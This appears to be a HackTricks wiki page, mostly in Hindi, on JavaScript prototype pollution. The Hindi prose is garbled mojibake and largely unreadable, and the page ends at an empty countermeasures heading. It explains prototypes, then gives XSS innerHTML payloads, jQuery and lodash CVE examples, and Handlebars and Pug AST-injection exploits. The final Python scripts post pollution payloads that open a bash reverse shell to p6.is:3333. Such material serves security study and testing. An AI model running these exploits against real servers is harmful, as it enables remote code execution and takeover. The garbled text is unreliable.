# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

рджреВрд╕рд░реЗ рддрд░реАрдХреЗ HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## Objects in JavaScript <a href="#053a" id="053a"></a>

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдореЗрдВ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ `Object` рдХреЛ рд╕рдордЭрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрд╕ рдПрдХ рдХреБрдВрдЬреА рдФрд░ рдорд╛рди рдЬреЛрдбрд╝реЛрдВ рдХрд╛ рд╕рдВрдЧреНрд░рд╣ рд╣реИ, рдЬрд┐рд╕реЗ рдЕрдХреНрд╕рд░ рдЙрд╕ рдСрдмреНрдЬ
```javascript
console.log(Object.create(null)); // prints an empty object
```
![](<../../../.gitbook/assets/image (360).png>)

рдкрд┐рдЫрд▓реЗ рдЕрдзреНрдпрд╛рдп рдореЗрдВ рд╣рдордиреЗ рд╕реАрдЦрд╛ рдХрд┐ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреБрдВрдЬрд┐рдпреЛрдВ рдФрд░ рдорд╛рдиреЛрдВ рдХрд╛ рд╕рдВрдЧреНрд░рд╣ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╕рдордЭрдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдПрдХ `null` рдСрдмреНрдЬ
```javascript
function person(fullName, age) {
this.age = age;
this.fullName = fullName;
this.details = function() {
return this.fullName + " has age: " + this.age;
}
}
```
![](<../../../.gitbook/assets/image (361).png>)
```javascript
var person1 = new person("Satoshi", 70);
```
![](<../../../.gitbook/assets/image (362).png>)

## JavaScript рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдкреНрд╕

рдПрдХ рдмрд╛рдд рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╕рдордп рдмрджрд▓рд╛/рд╕рдВрд╢реЛрдзрд┐рдд/рд╣рдЯрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдХрдХреНрд╖рд╛рдУрдВ рдореЗрдВ рдлрд╝рдВрдХреНрд╢рди рдбрд╛рдпрдирд╛рдорд┐рдХ рд░реВрдк рд╕реЗ рдЬреЛрдбрд╝реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

![](<../../../.gitbook/assets/image (363).png>)

рдХрдХреНрд╖рд╛рдУрдВ рдХреЗ рдлрд╝рдВрдХреНрд╢рди рднреА рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ (рдЬреИрд╕реЗ `toString` рдпрд╛ `valueOf` рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдорд╛рдорд▓реЛрдВ рдореЗрдВ):

![](<../../../.gitbook/assets/image (364).png>)

![](<../../../.gitbook/assets/image (365).png>)

## рд╡рд┐рд░рд╛рд╕рдд

рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк-рдЖрдзрд╛рд░рд┐рдд рдкреНрд░реЛрдЧреНрд░рд╛рдо рдореЗрдВ, рдСрдмреНрдЬ
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
```
**рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЛрдВ рд╕реЗ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА рд╕рдВрд░рдЪрдирд╛ рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рд╕рдВрднрд╡ рд╣реИ:**
```javascript
person1.__proto__.__proto__
person.__proto__.__proto__
```
рдЗрд╕рд▓рд┐рдП, рдЬреИрд╕рд╛ рдкрд╣рд▓реЗ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЕрдм рдпрджрд┐ рдПрдХ рдЧреБрдг Object рдпреЛрдЬрдирд╛ рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╣рд░ JavaScript object рдХреЛ рдирдП рдЧреБрдг рддрдХ рдкрд╣реБрдВрдЪ рд╣реЛрдЧреА:
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person1.__proto__.__proto__.printHello = function(){console.log("Hello");}
person1.printHello() //This now works and prints hello
//Add constant as new property
person1.__proto__.__proto__.globalconstant = true
person1.globalconstant  //This now works and is "true"
```
рдЗрд╕рдХреЗ рдмрд╛рдж рдкреНрд░рддреНрдпреЗрдХ JS рдСрдмреНрдЬ
```javascript
function person(fullName) {
this.fullName = fullName;
}
var person1 = new person("Satoshi");
//Add function as new property
person.prototype.sayHello = function(){console.log("Hello");}
person1.sayHello() //This now works and prints hello
//Add constant as new property
person.prototype.newConstant = true
person1.newConstant //This now works and is "true"

//The same could be achieved using this other way:
person1.constructor.prototype.sayHello = function(){console.log("Hello");}
person1.constructor.prototype.newConstant = true
```
**рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдХреЗрд╡рд▓ `person` рдХрдХреНрд▓рд╛рд╕ рд╕реЗ рдмрдирд╛рдП рдЧрдП **рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдкреНрд░рднрд╛рд╡рд┐рдд рд╣реЛрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдкреНрд░рддреНрдпреЗрдХ рдЙрдиреНрд╣реЗрдВ рдЕрдм **`sayHello` рдФрд░ `newConstant`** рдкреНрд░реЙрдкрд░реНрдЯреАрдЬрд╝ рдХреЛ рдЗрдиреНрд╣реЗрд░рд┐рдЯ рдХрд░реЗрдЧрд╛ред

**JS рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдкреЙрдЗрдЬрд╝рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди рдХрд╛ рджреЛ рддрд░реАрдХреЗ рд╣реИрдВред**

рдкрд╣рд▓рд╛ рддрд░реАрдХрд╛ рд╣реИ **Object** рдХреА рдкреНрд░реЙрдкрд░реНрдЯреА рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдХреЛ рдкреЛрд▓реНрд▓реВрдЯ рдХрд░рдирд╛ (рдЬреИрд╕рд╛ рдХрд┐ рдкрд╣рд▓реЗ рдХрд╣рд╛ рдЧрдпрд╛ рдерд╛ рдХрд┐ рд╣рд░ JS рдСрдмреНрдЬреЗрдХреНрдЯ рдЗрд╕рд╕реЗ рдЗрдиреНрд╣реЗрд░рд┐рдЯ рдХрд░рддрд╛ рд╣реИ):
```javascript
Object.prototype.sayBye = function(){console.log("bye!")}
```
рдпрджрд┐ рдЖрдк рдРрд╕рд╛ рдХрд░ рдкрд╛рддреЗ рд╣реИрдВ, рддреЛ рдкреНрд░рддреНрдпреЗрдХ JS рдСрдмреНрдЬ
```javascript
something = {"a": "b"}
something.constructor.prototype.sayHey = function(){console.log("Hey!")}
```
рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, **рдкреНрд░рддреНрдпреЗрдХ JS рдСрдмреНрдЬ
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Array elements pollution

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк JS рдореЗрдВ рдСрдмреНрдЬ
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html elements pollution

JS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ HTML element рдЙрддреНрдкрдиреНрди рдХрд░рддреЗ рд╕рдордп **`innerHTML`** рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд** рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ **рд╡рд┐рдЪрд╛рд░рд╣реАрди HTML рдХреЛрдб** рд▓рд┐рдЦ рд╕рдХреЗред [рдЗрд╕ рд▓реЗрдЦ рд╕реЗ рд╡рд┐рдЪрд╛рд░ рдФрд░ рдЙрджрд╛рд╣рд░рдг](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/)ред

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## рдЙрджрд╛рд╣рд░рдг

### рдореВрд▓ рдЙрджрд╛рд╣рд░рдг

рддреЛ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди рдХрд╣рд╛рдБ рд╣реИ? рдпрд╣ рдЗрд╕ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдПрдХ рдмрдЧ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ `Object.prototype` рдХреА рдЧреБрдгрдзрд░реНрдореЛрдВ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИред рдХреНрдпреЛрдВрдХрд┐ рдкреНрд░рддреНрдпреЗрдХ рд╕рд╛рдзрд╛рд░рд┐рдд рдСрдмреНрдЬреЗрдХреНрдЯ `Object.prototype` рд╕реЗ рдЕрдкрдиреЗ рдЧреБрдгрдзрд░реНрдореЛрдВ рдХреЛ рд╡рд╛рд░рд┐рд╕реНрдд рдХрд░рддрд╛ рд╣реИ, рд╣рдо рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред рд╕рдмрд╕реЗ рдЖрдо рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рдЙрджрд╛рд╣рд░рдг рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИ:
```javascript
if (user.isAdmin) {   // do something important!}
```
рдпрд╣рд╛рдБ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдПрдХ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди рд╣реИ рдЬреЛ `Object.prototype.isAdmin = true` рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдмрдирд╛рддрд╛ рд╣реИред рдлрд┐рд░, рдЬрдм рддрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдиреЗ рдХрд┐рд╕реА рдорд╛рди рдХреЛ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рд╣реЛ, `user.isAdmin` рд╣рдореЗрд╢рд╛ рд╕рдЪ рд╣реЛрддрд╛ рд╣реИ!

![](https://research.securitum.com/wp-content/uploads/sites/2/2019/10/image-1.png)

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `obj[a][b] = value`ред рдЕрдЧрд░ рд╣рдорд▓рд╛рд╡рд░ `a` рдФрд░ `value` рдХрд╛ рдорд╛рди рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдЙрд╕реЗ рдХреЗрд╡рд▓ `a` рдХреЗ рдорд╛рди рдХреЛ `__proto__` рдореЗрдВ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ (рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ, `obj["__proto__"]` рдФрд░ `obj.__proto__` рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╕рдордХрдХреНрд╖ рд╣реИрдВ) рддреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдореМрдЬреВрдж рд╕рднреА рдореМрдЬреВрджрд╛ рдСрдмреНрдЬ
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Pollution рд╕реЗ RCE рддрдХ

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрдпреВрд╢рди рд╕реЗ XSS рддрдХ

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019тАУ11358: jQuery $ .extend рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрдпреВрд╢рди рд╣рдорд▓рд╛

$ .extend, рдЕрдЧрд░ рдЧрд▓рддреА рд╕реЗ рд╣реИрдВрдбрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдП, рддреЛ рдСрдмреНрдЬ
```javascript
If (user.isAdmin === true) {
// do something for admin
}
```
рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрднреА рддрдХ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ (`undefined`), рддреЛ `isAdmin` рдЧреБрдгрд╛ рдЙрд╕рдХреЗ рдореВрд▓ рдСрдмреНрдЬ
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
console.log({}.devMode); // true
```
### CVE-2018тАУ3721, CVE-2019тАУ10744: Prototype pollution attack through lodash

[Lodash](https://www.npmjs.com/package/lodash) рдПрдХ рдкреНрд░рд╕рд┐рджреНрдз рд▓рд╛рдЗрдмреНрд░реЗрд░реА рд╣реИ рдЬреЛ рдмрд╣реБрдд рд╕рд╛рд░реЗ рд╡рд┐рднрд┐рдиреНрди рдлрд╝рдВрдХреНрд╢рди рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ, рдЬреЛ рд╣рдореЗрдВ рдХреЛрдб рд▓рд┐рдЦрдиреЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╕реБрд╡рд┐рдзрд╛ рдФрд░ рд╕реБрд╡реНрдпрд╡рд╕реНрдерд┐рддрддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ рдЬрд┐рд╕рдХреЗ рдКрдкрд░ 19 рдорд┐рд▓рд┐рдпрди рд╕рдкреНрддрд╛рд╣рд╛рдВрддрд┐рдХ рдбрд╛рдЙрдирд▓реЛрдб рд╣реЛрддреЗ рд╣реИрдВред рдФрд░ рдпрд╣ рдЬреЗрдХреНрд╡реЗрд░реА рдХреА рддрд░рд╣реА рд╕рдорд╕реНрдпрд╛ рд╣реИред

**CVE-2018тАУ3721**

**CVE-2019тАУ10744**

рдпрд╣ рдмрдЧ Lodash рдХреЗ рд╕рднреА рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╕рдВрд╕реНрдХрд░рдг 4.17.11 рдореЗрдВ рдареАрдХ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

### рдПрдХ рдФрд░ рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рдЬрд┐рд╕рдореЗрдВ CVEs рд╣реИрдВ

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### AST Prototype Pollution in NodeJS

NodeJS рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдПрдмреНрд╕реНрдЯреНрд░реИрдХреНрдЯ рд╕рд┐рдВрдЯреИрдХреНрд╕ рдЯреНрд░реА (AST) рдХрд╛ рд╡реНрдпрд╛рдкрдХ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдЬреИрд╕реЗ рдХрд┐ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрдиреНрд╕ рдФрд░ рдЯрд╛рдЗрдкрд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд▓рд┐рдПред рдпрд╣ рдЦрдВрдб рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрдиреНрд╕ рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рднреЗрджрднрд╛рд╡реЛрдВ рдХрд╛ рдЕрдиреНрд╡реЗрд╖рдг рдХрд░рддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рдФрд░ рдкрдЧред

#### рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рд╡рд┐рдХрд▓реНрдк рд╡рд┐рд╢реНрд▓реЗрд╖рдг

рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬрди рдХреЛ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди рдХреЗ рд▓рд┐рдП рдЙрддреНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╡рд┐рдХрд▓реНрдкрд┐рдд рд░реВрдк рд╕реЗ `javascript-compiler.js` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ `appendContent` рдФрд░ `pushSource` рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рднреАрддрд░ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рд╡рд┐рдХрд▓реНрдкрд┐рдд рд╣реИ, рдЬрд╣рд╛рдВ `appendContent` `pendingContent` рдХреЛ рдЬреЛрдбрд╝рддрд╛ рд╣реИ рдЕрдЧрд░ рдпрд╣ рдореМрдЬреВрдж рд╣реИ, рдФрд░ `pushSource` рд╕реНрд░реЛрдд рдХреЛ рдврдХрдиреЗ рдХреЗ рдмрд╛рдж `pendingContent` рдХреЛ `undefined` рдкрд░ рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИред

##### рд╢реЛрд╖рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛

рд╢реЛрд╖рдг рдореЗрдВ рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди AST рдХреЛ рдорд╛рдирд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИ:

1. **рдкрд╛рд░реНрд╕рд░ рдореЗрдирд┐рдкреБрд▓реЗрд╢рди**: рдкрд╛рд░реНрд╕рд░, `NumberLiteral` рдиреЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдорд╛рдиреЛрдВ рдХреЛ рд╕рдВрдЦреНрдпрд╛рдУрдВ рдореЗрдВ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╛рдзреНрдп рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕реЗ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреЛрд▓реНрд▓реВрд╢рди рджреНрд╡рд╛рд░рд╛ рдЙрдореНрдореАрджрд╡рд╛рд░ рдЧреИрд░-рд╕рдВрдЦреНрдпрд╛рддреНрдордХ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХреЛ рдбрд╛рд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
2. **рдХрдВрдкрд╛рдЗрд▓рд░ рд╣реИрдВрдбрд▓рд┐рдВрдЧ**: рдХрдВрдкрд╛рдЗрд▓рд░ рдпрд╛ рддреЛ рдПрдХ AST рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ рдпрд╛ рдПрдХ рдЯреЗрдореНрдкрд▓реЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧред рдпрджрд┐ `input.type` `Program` рд╣реИ, рддреЛ рдЗрдирдкреБрдЯ рдХреЛ рдкреВрд░реНрд╡-рдкрд╛рд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд╢реЛрд╖рдг рдХреА рдУрд░ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИред
3. **рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди**: `Object.prototype` рдХреЛ рдорд╛рдирд┐рдкреБрд▓реЗрдЯ рдХрд░рдХреЗ, рд╡рд┐рд╖рдпрд╕реНрде рдХреЛрдб рдХреЛ рдЯреЗрдореНрдкрд▓реЗрдЯ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рд╕рдВрднрд╛рд╡рд┐рдд рджреВрд░рд╕реНрде рдХреЛрдб рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдХреА рдУрд░ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИред

рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рд╡рд┐рдХрд▓реНрдк рд╢реЛрд╖рдг рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
рдКрдкрд░ рдХрд╛ рдХреЛрдб рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреИрд╕реЗ Handlebars рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рд╡рд┐рдЪрд┐рддреНрд░ рдХреЛрдб рдбрд╛рд▓ рд╕рдХрддрд╛ рд╣реИред

**рдмрд╛рд╣рд░реА рд╕рдВрджрд░реНрдн**: [рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдХреЗ рд╕рдВрдмрдВрдзрд┐рдд рдореБрджреНрджрд╛ 'flat' рдкреБрд╕реНрддрдХрд╛рд▓рдп рдореЗрдВ](https://github.com/hughsk/flat/issues/105)

рдкрд╛рдпрдерди рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pug рд╕реБрд░рдХреНрд╖рд┐рддрддрд╛ рджреЛрд╖

рд╣реИрдВрдбрд▓рдмрд╛рд░реНрд╕ рдХреЗ рд╕рдорд╛рди, Pug рднреА рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [AST Injection in Pug](https://blog.p6.is/AST-Injection/#Pug) рдкрд░ рдЙрдкрд▓рдмреНрдз рд╣реИред

Pug рдореЗрдВ рдкреНрд░реЛрдЯреЛрдЯрд╛рдЗрдк рдкреНрд░рджреВрд╖рдг рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### рдкреНрд░рддрд┐рдмрдВрдзреА рдЙрдкрд╛рдп

